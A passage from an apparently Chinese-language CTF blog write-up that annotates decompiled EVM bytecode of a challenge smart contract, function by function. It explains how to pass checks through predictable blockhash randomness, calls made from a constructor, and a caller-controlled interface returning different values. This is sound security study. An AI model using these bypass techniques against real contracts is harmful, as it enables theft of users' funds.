class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs p">function payforflag(var arg0) &#123;<br>        &#x2F;&#x2F;其实就是用了onlyOwner来修饰函数，等价于语句require(msg.sender &#x3D;&#x3D; owner)<br>        if (msg.sender !&#x3D; storage[0x00] &amp; 0xffffffffffffffffffffffffffffffffffffffff) &#123; revert(memory[0x00:0x00]); &#125;<br>    <br>        &#x2F;&#x2F;需要调用合约的账户后三位是0x111<br>        if (msg.sender &amp; 0x0fff !&#x3D; 0x0111) &#123; revert(memory[0x00:0x00]); &#125;<br>    <br>        &#x2F;&#x2F;0x06即slot7 ，说明前面还定义了一些变量<br>        memory[0x00:0x20] &#x3D; msg.sender;<br>        memory[0x20:0x40] &#x3D; 0x06;<br>        <br>        &#x2F;&#x2F;类似于keccak256(abi.encodePacked(k, p))，这里很明显是一个mapping类型变量<br>        &#x2F;&#x2F;读取值然后要求  level[msg.sender] &#x3D;&#x3D; 3(level是变量名这里是看了源码写的，下面的变量名同)<br>        if (storage[keccak256(memory[0x00:0x40])] !&#x3D; 0x03) &#123; revert(memory[0x00:0x00]); &#125;<br>    <br>        &#x2F;&#x2F;0x05 即 slot6 ，也是一个mapping类型<br>        memory[0x00:0x20] &#x3D; msg.sender;<br>        memory[0x20:0x40] &#x3D; 0x05;<br>        <br>        &#x2F;&#x2F;要求 mycart[msg.sender] &gt; 10000000000000000000<br>        if (storage[keccak256(memory[0x00:0x40])] &lt;&#x3D; 0x8ac7230489e80000) &#123; revert(memory[0x00:0x00]); &#125;<br>    <br>        &#x2F;&#x2F;将storage[0x04]赋值为0x00，<br>        memory[0x00:0x20] &#x3D; msg.sender;<br>        memory[0x20:0x40] &#x3D; 0x04;<br>        storage[keccak256(memory[0x00:0x40])] &#x3D; 0x00;<br>        <br>        &#x2F;&#x2F;将storage[0x06]赋值为0x00，即level[msg.sender] &#x3D; 0<br>        memory[0x00:0x20] &#x3D; msg.sender;<br>        memory[0x20:0x40] &#x3D; 0x06;<br>        storage[keccak256(memory[0x00:0x40])] &#x3D; 0x00;<br>        <br>&#x2F;&#x2F;storage[0x02] 最后个字节赋值为0，这里也能看出这是一个单字节变量，这里有可能是个bool型，<br>&#x2F;&#x2F;但是也可能是个变长型变量例如动态数组等，这里存储的是长度，从源码可以看到这里是对应一个bool型变量。<br>        storage[0x02] &#x3D; (storage[0x02] &amp; ~0xff) | 0x00;<br>        <br>        <br>        &#x2F;&#x2F;0xff * 0x0100 ** 0x14)&#x3D;0xff0000000000000000000000000000000000000000 <br>        &#x2F;&#x2F;算得的结果是21字节，所以大概率第一个字节是个bool型，后面二十字节是一个address类型值<br>        &#x2F;&#x2F;所以这里就是将storage[0x00]第一个字节赋值为0x00<br>        storage[0x00] &#x3D; (storage[0x00] &amp; ~(0xff * 0x0100 ** 0x14)) | 0x00;<br>        <br>        <br>        var var0 &#x3D; 0x00;<br>        var var1 &#x3D; 0x0eed;<br>        var var2 &#x3D; 0x01;<br>        var var3 &#x3D; var0;<br>        func_1489(var2, var3);<br>        var0 &#x3D; 0x296b9274d26b7baffb5cc93e1af19012c35ace27ba9acf1badff99d1f76dfa69;<br>        var temp0 &#x3D; arg0;<br>        var1 &#x3D; temp0;<br>        var temp1 &#x3D; memory[0x40:0x60];<br>        var2 &#x3D; temp1;<br>        var3 &#x3D; var2;<br>        var temp2 &#x3D; var3 + 0x20;<br>        memory[var3:var3 + 0x20] &#x3D; temp2 - var3;<br>        memory[temp2:temp2 + 0x20] &#x3D; memory[var1:var1 + 0x20];<br>        var var4 &#x3D; temp2 + 0x20;<br>        var var6 &#x3D; memory[var1:var1 + 0x20];<br>        var var5 &#x3D; var1 + 0x20;<br>        var var7 &#x3D; var6;<br>        var var8 &#x3D; var4;<br>        var var9 &#x3D; var5;<br>        var var10 &#x3D; 0x00;<br>    <br>        if (var10 &gt;&#x3D; var7) &#123;<br>        label_0F50:<br>            var temp3 &#x3D; var6;<br>            var4 &#x3D; temp3 + var4;<br>            var5 &#x3D; temp3 &amp; 0x1f;<br>        <br>            if (!var5) &#123;<br>                var temp4 &#x3D; memory[0x40:0x60];<br>                log(memory[temp4:temp4 + var4 - temp4], [stack[-6]]);<br>                return;<br>            &#125; else &#123;<br>                var temp5 &#x3D; var5;<br>                var temp6 &#x3D; var4 - temp5;<br>                memory[temp6:temp6 + 0x20] &#x3D; ~(0x0100 ** (0x20 - temp5) - 0x01) &amp; memory[temp6:temp6 + 0x20];<br>                var temp7 &#x3D; memory[0x40:0x60];<br>                log(memory[temp7:temp7 + (temp6 + 0x20) - temp7], [stack[-6]]);<br>                return;<br>            &#125;<br>        &#125; else &#123;<br>        label_0F3E:<br>            var temp8 &#x3D; var10;<br>            memory[var8 + temp8:var8 + temp8 + 0x20] &#x3D; memory[var9 + temp8:var9 + temp8 + 0x20];<br>            var10 &#x3D; temp8 + 0x20;<br>        <br>            if (var10 &gt;&#x3D; var7) &#123; goto label_0F50; &#125;<br>            else &#123; goto label_0F3E; &#125;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="0xed21248c-Deposit"><a href="#0xed21248c-Deposit" class="headerlink" title="0xed21248c Deposit()"></a>0xed21248c Deposit()</h3><p>调用Deposit函数倒没啥，因为没有传参，所以直接调用即可，</p><figure class="highlight gcode"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gcode">&#125; else <span class="hljs-keyword">if</span> <span class="hljs-comment">(var0 == 0xed21248c)</span> &#123;<br>    <span class="hljs-comment">// Dispatch table entry for Deposit()</span><br>    var<span class="hljs-number">1</span> = <span class="hljs-number">0</span>x<span class="hljs-number">050</span>c;<br>    Deposit<span class="hljs-comment">()</span>;<br>    stop<span class="hljs-comment">()</span>;<br></code></pre></div></td></tr></table></figure><p>函数分析。</p><ul><li><p>首先需要msg.value &gt;= 500000000000000000000 wei 即 500eth，然后slot[0x05]  + 0x01.</p></li><li><p>结合 payforflag 来看，这个操作不现实，因为 payforflag 中要求 storage[0x05] &gt; 0x8ac7230489e80000 ，即要将 msg.value &gt;= 500 eth 进行 0x8ac7230489e80000+1 次</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sodility">function Deposit() &#123;<br>&#x2F;&#x2F;要求msg.value &gt;&#x3D; 500000000000000000000<br>    if (msg.value &lt; 0x1b1ae4d6e2ef500000) &#123; return; &#125;<br><br>&#x2F;&#x2F;slot[0x05] &#x3D; slot[0x05]  + 0x01<br>    memory[0x00:0x20] &#x3D; msg.sender;<br>    memory[0x20:0x40] &#x3D; 0x05;<br>    var temp0 &#x3D; keccak256(memory[0x00:0x40]);<br>    storage[temp0] &#x3D; storage[temp0] + 0x01;<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="0x24b04905-gift"><a href="#0x24b04905-gift" class="headerlink" title="0x24b04905 gift()"></a>0x24b04905 gift()</h3><p>函数调用，没啥说的。</p><figure class="highlight gcode"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gcode">&#125; else <span class="hljs-keyword">if</span> <span class="hljs-comment">(var0 == 0x24b04905)</span> &#123;<br>    <span class="hljs-comment">// Dispatch table entry for gift()</span><br>    var<span class="hljs-number">1</span> = msg.value;<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-comment">(var1)</span> &#123; revert<span class="hljs-comment">(memory[0x00:0x00])</span>; &#125;<br><br>    var<span class="hljs-number">1</span> = <span class="hljs-number">0</span>x<span class="hljs-number">01</span>d<span class="hljs-number">5</span>;<br>    gift<span class="hljs-comment">()</span>;<br>    stop<span class="hljs-comment">()</span>;<br></code></pre></div></td></tr></table></figure><p>函数分析</p><ul><li>要求 address(msg.sender).code.length == 0 ，即在合约 constructor 中运行即可</li><li>要求 msg.sender 后三个数为 0x111</li><li>满足上述条件后，storage[0x04] = 100 ， storage[0x05] += 1 ， storage[0x06] += 1<figure class="highlight inform7"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs inform7">function gift() &#123;<br>//要求address(msg.sender).code.length == 0 就是要求在construct构造函数中使用，因为此时没有函数签名了。<br>        var var0 = address(msg.sender).code.length;<br>    <br>        if (var0 != 0x00) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    <br>        memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>        memory<span class="hljs-comment">[0x20:0x40]</span> = 0x05;<br>    //要求 slot<span class="hljs-comment">[0x05]</span> == 0<br>        if (storage<span class="hljs-comment">[keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>)]</span> != 0x00) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    //要求msg.sender账户后三位是0x111<br>        if (msg.sender &amp; 0x0fff != 0x0111) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>        <br>        //slot<span class="hljs-comment">[0x04]</span> = 0x64<br>        memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>        memory<span class="hljs-comment">[0x20:0x40]</span> = 0x04;<br>        storage<span class="hljs-comment">[keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>)]</span> = 0x64;<br>        <br>        //slot<span class="hljs-comment">[0x05]</span>=slot<span class="hljs-comment">[0x05]</span> + 1 <br>        memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>        memory<span class="hljs-comment">[0x20:0x40]</span> = 0x05;<br>        var temp0 = keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>);<br>        storage<span class="hljs-comment">[temp0]</span> = storage<span class="hljs-comment">[temp0]</span> + 0x01;<br>        <br>        //slot<span class="hljs-comment">[0x06]</span> = slot<span class="hljs-comment">[0x06]</span> + 1<br>        memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>        memory<span class="hljs-comment">[0x20:0x40]</span> = 0x06;<br>        var temp1 = keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>);<br>        storage<span class="hljs-comment">[temp1]</span> = storage<span class="hljs-comment">[temp1]</span> + 0x01;<br>    &#125;<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="0x23de8635-func-06CE-arg0"><a href="#0x23de8635-func-06CE-arg0" class="headerlink" title="0x23de8635 func_06CE(arg0)"></a>0x23de8635 func_06CE(arg0)</h3><p>这个函数逆向稍显复杂，但相应源码其实很短</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> <span class="hljs-constructor">Chopping(<span class="hljs-params">uint</span> <span class="hljs-params">_hand</span>)</span> public &#123;<br>    Tmall tmall = <span class="hljs-constructor">Tmall(<span class="hljs-params">msg</span>.<span class="hljs-params">sender</span>)</span>;<br>    <span class="hljs-keyword">if</span> (!tmall.<span class="hljs-constructor">Chop_hand(<span class="hljs-params">_hand</span>)</span>) &#123;<br>        hand = _hand;<br>        have_chopped = tmall.<span class="hljs-constructor">Chop_hand(<span class="hljs-params">hand</span>)</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>反编译如下，分析都写在注释里面了。所以这个函数最终干了什么呢。</p><ul><li>调用了两次同一个函数0xa8286aca</li><li>第一次调用仅仅就判断了函数的返回值取反之后是满足true还是false，如果通过if判断则会将storage[0x03]赋值为第一次调用0xa8286aca的函数参数，然后第二次调用0xa8286aca函数，并将结果赋值给storage[0x02].</li></ul><p>而在大佬wp里面明显看出来了更多东西。这里有个疑问，是如何确定两次调用函数返回结果不一样的。</p><blockquote><p>总体来看，这里调用了 0xa8286aca 两次，输入同样的参数 arg0 一次， 0xa8286aca 第一次和第二次返回的结果不一样，但是一个 function 当它的参数确定时，他的返回结果也应该是确定的，而不会两次不一样，所以 0xa8286aca 这里应该是一个接口函数，我们是可以改写的，最后改变了 storage[0x02] 的值</p></blockquote><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">function func_06CE(<span class="hljs-keyword">var</span> arg0) &#123;<br>        <span class="hljs-keyword">var</span> var0 = msg.sender;<br>        <span class="hljs-keyword">var</span> var1 = var0 &amp; 0xffffffffffffffffffffffffffffffffffffffff;<br>        <span class="hljs-keyword">var</span> var2 = 0xa8286aca;<br>        <span class="hljs-keyword">var</span> temp0 = <span class="hljs-keyword">memory</span>[0x40:0x60];<br>        <br>        <span class="hljs-comment">//将memory[temp0:temp0 + 0x20]设置成了一个函数签名值</span><br>        <span class="hljs-keyword">memory</span>[temp0:temp0 + 0x20] = (var2 &amp; 0xffffffff) * 0x0100000000000000000000000000000000000000000000000000000000;<br>        <span class="hljs-keyword">var</span> temp1 = temp0 + 0x04;<br>        <br>        <span class="hljs-comment">//赋值arg0 ，其实就是调用0xa8286aca函数时的参数。</span><br>        <span class="hljs-keyword">memory</span>[temp1:temp1 + 0x20] = arg0;<br>        <span class="hljs-keyword">var</span> var3 = temp1 + 0x20; <span class="hljs-comment">// memory[0x40:0x60]  + 0x04  + 0x20</span><br>        <span class="hljs-keyword">var</span> var4 = 0x20;<br>        <span class="hljs-keyword">var</span> var5 = <span class="hljs-keyword">memory</span>[0x40:0x60];<br>        <span class="hljs-keyword">var</span> var6 = var3 - var5; <span class="hljs-comment">//0x24</span><br>        <span class="hljs-keyword">var</span> var7 = var5; <span class="hljs-comment">//memory[0x40:0x60];</span><br>        <span class="hljs-keyword">var</span> var8 = 0x00;<br>        <span class="hljs-keyword">var</span> var9 = var1; <span class="hljs-comment">//msg.sender</span><br>        <span class="hljs-keyword">var</span> var10 = !address(var9).code.length;<br>    <br>        <span class="hljs-keyword">if</span> (var10) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>    <br>        <span class="hljs-keyword">var</span> temp2;<br>        <span class="hljs-comment">//调用0xa8286aca函数,temp2用于判断是否调用成功,memory[var5:var5 + var4]存储返回值</span><br>        temp2, <span class="hljs-keyword">memory</span>[var5:var5 + var4] = address(var9).call.gas(msg.gas).value(var8)(<span class="hljs-keyword">memory</span>[var7:var7 + var6]);<br>        var4 = !temp2;<br>    <br>        <span class="hljs-comment">//判断是否调用成功</span><br>        <span class="hljs-keyword">if</span> (!var4) &#123;<br>            var1 = <span class="hljs-keyword">memory</span>[0x40:0x60];<br>            var2 = returndata.length;<br>        <br>            <span class="hljs-keyword">if</span> (var2 &lt; 0x20) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>        <br>        <span class="hljs-comment">//判断函数返回值是true还是false（不一定就必须返回bool类型）</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">memory</span>[var1:var1 + 0x20]) &#123;<br>            label_0850:<br>                <span class="hljs-keyword">return</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">//将函数参数赋值给了storage[0x03]</span><br>                storage[0x03] = arg0;<br>                <br><span class="hljs-comment">//下面流程和上面差不多，就是再次调用0xa8286aca这个函数，区别在于最后改变了storage[0x02]的值</span><br>                var1 = var0 &amp; 0xffffffffffffffffffffffffffffffffffffffff;<br>                var2 = 0xa8286aca;<br>                <span class="hljs-keyword">var</span> temp3 = <span class="hljs-keyword">memory</span>[0x40:0x60];<br>                <span class="hljs-keyword">memory</span>[temp3:temp3 + 0x20] = (var2 &amp; 0xffffffff) * 0x0100000000000000000000000000000000000000000000000000000000;<br>                <span class="hljs-keyword">var</span> temp4 = temp3 + 0x04;<br>                <span class="hljs-keyword">memory</span>[temp4:temp4 + 0x20] = storage[0x03];<br>                var3 = temp4 + 0x20;<br>                var4 = 0x20;<br>                var5 = <span class="hljs-keyword">memory</span>[0x40:0x60];<br>                var6 = var3 - var5;<br>                var7 = var5;<br>                var8 = 0x00;<br>                var9 = var1;<br>                var10 = !address(var9).code.length;<br>            <br>                <span class="hljs-keyword">if</span> (var10) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>            <br>                <span class="hljs-keyword">var</span> temp5;<br>                temp5, <span class="hljs-keyword">memory</span>[var5:var5 + var4] = address(var9).call.gas(msg.gas).value(var8)(<span class="hljs-keyword">memory</span>[var7:var7 + var6]);<br>                var4 = !temp5;<br>            <br>                <span class="hljs-keyword">if</span> (!var4) &#123;<br>                    var1 = <span class="hljs-keyword">memory</span>[0x40:0x60];<br>                    var2 = returndata.length;<br>                <br>                    <span class="hljs-keyword">if</span> (var2 &lt; 0x20) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>               <br>               <span class="hljs-comment">//这里看起来很复杂，但其实最终就是storage[0x02]= memory[var1:var1 + 0x20]</span><br>                    storage[0x02] = !!<span class="hljs-keyword">memory</span>[var1:var1 + 0x20] | (storage[0x02] &amp; ~0xff); <br>                    goto label_0850;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">var</span> temp6 = returndata.length;<br>                    <span class="hljs-keyword">memory</span>[0x00:0x00 + temp6] = returndata[0x00:0x00 + temp6];<br>                    revert(<span class="hljs-keyword">memory</span>[0x00:0x00 + returndata.length]);<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">var</span> temp7 = returndata.length;<br>            <span class="hljs-keyword">memory</span>[0x00:0x00 + temp7] = returndata[0x00:0x00 + temp7];<br>            revert(<span class="hljs-keyword">memory</span>[0x00:0x00 + returndata.length]);<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><h3 id="0x9189fec1-guess-uint256"><a href="#0x9189fec1-guess-uint256" class="headerlink" title="0x9189fec1 guess(uint256)"></a>0x9189fec1 guess(uint256)</h3><ul><li>首先要求 arg0 == block.blockHash(block.number - 0x01) % 3 ，这个很容易满足，因为利用区块号生成的随机数是可预测的</li><li>满足要求后，<code>storage[0x00] = (storage[0x00] &amp; ~(0xff * 0x0100 ** 0x14)) | 0x0100 ** 0x14 </code>，即 storage[0x00] 的address地址的前一个字节设为1，其实就是bool和address放在一个slot下的情况，这里只改了那个bool值。<figure class="highlight maxima"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs maxima">function guess(<span class="hljs-built_in">var</span> arg0) &#123;<br>    <span class="hljs-built_in">var</span> <span class="hljs-built_in">var1</span> = <span class="hljs-number">0x00</span>;<br>    <span class="hljs-built_in">var</span> var0 = <span class="hljs-built_in">block</span>.blockHash(<span class="hljs-built_in">block</span>.number - <span class="hljs-number">0x01</span>);<br>    <span class="hljs-built_in">var</span> var2 = <span class="hljs-number">0x03</span>;<br>    <span class="hljs-built_in">var</span> var3 = var0;<br>    <br>    <span class="hljs-keyword">if</span> (!var2) &#123; assert(); &#125;<br>    <br>    <span class="hljs-built_in">var1</span> = var3 <span class="hljs-symbol">%</span> var2;<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">var1</span> != arg0) &#123; <span class="hljs-built_in">return</span>; &#125;<br>    <br>    storage[<span class="hljs-number">0x00</span>] = (storage[<span class="hljs-number">0x00</span>] &amp; ~(<span class="hljs-number">0xff</span> * <span class="hljs-number">0x0100</span> ** <span class="hljs-number">0x14</span>)) | <span class="hljs-number">0x0100</span> ** <span class="hljs-number">0x14</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="0xa6f2ae3a-buy"><a href="#0xa6f2ae3a-buy" class="headerlink" title="0xa6f2ae3a buy()"></a>0xa6f2ae3a buy()</h3>函数分析,这个函数较容易分析。<blockquote><p>要求 storage[0x06] == 1 ，这些调用 gift() 空投可以完成<br>要求 storage[0x05] == 1 ，这些调用 gift() 空投可以完成<br>要求 storage[0x02] == 1 ，结合 func_06CE 来看，只需使得 0xa8286aca 第二次调用返回 1 即可<br>要求 storage[0x00] / 0x0100 ** 0x14 &amp; 0xff == 1 ， 要求storage[0x00]的从低位数第21字节 == 0x01 ，这个满足 guess 即可<br>满足上述要求后，storage[0x05] += 1 ，storage[0x06] += 1</p></blockquote></li></ul><figure class="highlight inform7"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs inform7">function buy() &#123;<br><br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x06;<br>    <br>    //要求 storage<span class="hljs-comment">[0x06]</span> == 0x01<br>    if (storage<span class="hljs-comment">[keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>)]</span> != 0x01) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x05;<br>    <br>    //要求storage<span class="hljs-comment">[0x05]</span> == 0x01<br>    if (storage<span class="hljs-comment">[keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>)]</span> != 0x01) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    //要求storage<span class="hljs-comment">[0x02]</span> == 0x01<br>    if (!!(storage<span class="hljs-comment">[0x02]</span> &amp; 0xff) != !!0x01) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    //要求storage<span class="hljs-comment">[0x00]</span>的从低位数第21字节 == 0x01<br>    if (!!(storage<span class="hljs-comment">[0x00]</span> / 0x0100 ** 0x14 &amp; 0xff) != !!0x01) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x05;<br>    var temp0 = keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>);<br>    // storage<span class="hljs-comment">[0x05]</span> = storage<span class="hljs-comment">[0x05]</span> + 0x01<br>    storage<span class="hljs-comment">[temp0]</span> = storage<span class="hljs-comment">[temp0]</span> + 0x01;<br>    <br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x06;<br>    var temp1 = keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>);<br>   // storage<span class="hljs-comment">[0x06]</span> = storage<span class="hljs-comment">[0x06]</span> + 0x01<br>    storage<span class="hljs-comment">[temp1]</span> = storage<span class="hljs-comment">[temp1]</span> + 0x01;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="0x47f57b32-retract"><a href="#0x47f57b32-retract" class="headerlink" title="0x47f57b32 retract()"></a>0x47f57b32 retract()</h3><blockquote><p>要求 storage[0x01] == 0 （这里的storage[0x01]就是codex.length）<br>要求 storage[0x05] == 0x02 ，调用 gift 后，再调用 buy 即可<br>要求 storage[0x06] == 0x02 ，调用 gift 后，再调用 buy 即可<br>要求 storage[0x00] / 0x0100 ** 0x14 &amp; 0xff == 0x01 ，即 storage[0x00] 的高 96 位数值要求为 1 其实就是从低位开始第21字节前二十字节应该是一个address类型变量，这个满足 guess 即可<br>满足上述要求之后，storage[0x01] -= 0x1 ，这里应该是修改数组的长度</p></blockquote><figure class="highlight inform7"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs inform7">function retract() &#123;<br>    if (storage<span class="hljs-comment">[0x01]</span> != 0x00) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x05;<br>    //要求 storage<span class="hljs-comment">[0x05]</span> == 0x02<br>    if (storage<span class="hljs-comment">[keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>)]</span> != 0x02) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x06;<br>    //要求 storage<span class="hljs-comment">[0x06]</span> == 0x02<br>    if (storage<span class="hljs-comment">[keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>)]</span> != 0x02) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    if (!!(storage<span 